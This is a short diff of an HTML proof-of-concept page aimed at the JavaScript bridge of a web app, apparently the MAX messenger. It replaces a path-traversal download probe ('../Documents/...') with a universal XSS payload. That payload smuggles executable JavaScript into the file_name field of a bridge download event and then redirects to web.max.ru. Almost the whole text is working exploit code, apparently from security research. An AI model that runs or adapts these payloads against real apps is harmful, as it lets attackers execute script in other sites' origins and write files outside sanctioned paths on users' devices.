@@ -1,13 +1,22 @@
 <hr>
 <script>
   function DownloadFileFunction() {
-    window.WebApp.downloadFile("https://www.virusanalyst.com/eicar.zip", "../Documents/max_poc_traversal_probe.txt").then(res => {
-      savedkey = JSON.stringify(res);
-      document.getElementById("output3").innerHTML = "<h2>downloadFile attempt:<br/>" + savedkey + "</h2>";
-    }
-    ).catch((err)=> {
-      document.getElementById("output2").innerHTML = "<h2>downloadFile error:<br/>" + err + "</h2>";
-    });
+    const blobUrl = URL.createObjectURL(
+     new Blob(['UXSS'], {type: 'text/plain'})
+   );
+ 
+ const fileName = `'+(()=>{alert(window.origin);return""})()+'`;
+ 
+ window.WebViewHandler.postEvent(
+   'WebAppDownloadFile',
+   JSON.stringify({
+     requestId: 'bridge-poc-delayed-download',
+     url: blobUrl,
+     file_name: fileName
+   })
+ );
+ 
+ location.replace('https://web.max.ru/');
   }
 </script>
 <script src="https://st.max.ru/js/max-web-app.js"></script>
